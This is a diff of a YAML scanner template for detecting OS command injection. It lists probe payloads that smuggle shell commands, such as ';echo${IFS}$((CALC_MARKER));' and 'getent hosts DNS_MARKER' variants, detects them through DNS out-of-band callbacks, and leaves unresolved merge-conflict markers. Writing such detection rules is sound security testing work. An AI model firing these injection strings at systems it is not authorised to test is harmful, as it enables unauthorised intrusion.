@@ -1,29 +1,32 @@
+<<<<<<< HEAD
 #collect:
 #        - uniq:
 #                - [ URI ]
+=======
+>>>>>>> b87d3241eadae3f03ea808687425653fb7dc4cbf
 generate:
-        - payload:
-                - ;echo${IFS}$((CALC_MARKER)); # ${IFS} is equal to space
-                - \'getent${IFS}hosts${IFS}DNS_MARKER\'
-                - ;getent${IFS}hosts${IFS}DNS_MARKER;
-                - "`getent hosts DNS_MARKER`" # injection into double quotes and a raw command
-                - "x\ngentent${IFS}hosts${IFS}DNS_MARKER\nx"
-
-        - method:
-                - postfix
+  - payload:
+    - ;echo${IFS}$((CALC_MARKER)); # ${IFS} is equal to space
+    - \'getent${IFS}hosts${IFS}DNS_MARKER\'
+    - ;getent${IFS}hosts${IFS}DNS_MARKER;
+    - "`getent hosts DNS_MARKER`" # injection into double quotes and a raw command
+    - "|getent hosts DNS_MARKER" # DVWA Command Injection High
+    - "x\ngentent${IFS}hosts${IFS}DNS_MARKER\nx"
+  - method:
+    - postfix
 detect:
-        - oob:
-                - dns
-        - response:
-                - body: CALC_MARKER
+  - oob:
+    - dns
+  - response:
+    - body: CALC_MARKER
 meta-info:
-        - type: rce
-        - threat: 95
-        - tags:
-                - OS Commanding
-                - RCE
-                - Remote Code Execution
-                - Shell injection
-                - Command injection
-                - OWASP Top 10
-                - OWASP
+  - type: rce
+  - threat: 95
+  - tags:
+    - OS Commanding
+    - RCE
+    - Remote Code Execution
+    - Shell injection
+    - Command injection
+    - OWASP Top 10
+    - OWASP
